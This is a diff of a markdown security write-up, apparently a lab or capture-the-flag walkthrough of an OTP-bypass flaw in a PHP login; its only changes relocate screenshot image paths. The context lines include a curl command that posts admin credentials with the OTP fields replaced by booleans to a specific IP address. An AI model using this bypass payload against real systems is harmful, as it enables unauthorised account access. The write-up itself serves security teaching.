@@ -328,7 +328,7 @@ The frontend sends raw JSON:
 }
 ```
 
-![Login Intercept](login-intercept.png)
+![Login Intercept](./assets/login-intercept.png)
 
 However, **the backend never validates:**
 
@@ -369,7 +369,7 @@ We successfully exploited this using **two practical approaches**.
 
 The OTP values were replaced with booleans:
 
-![Burp Intercept](php-burp-intercept.png)
+![Burp Intercept](./assets/php-burp-intercept.png)
 
 ---
 
@@ -389,7 +389,7 @@ curl -s -X POST http://15.206.47.5:8080/login.php \
   -d '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}'
 ```
 
-![Curl Result](php-curl-result.png)
+![Curl Result](./assets/php-curl-result.png)
 
 ---
 
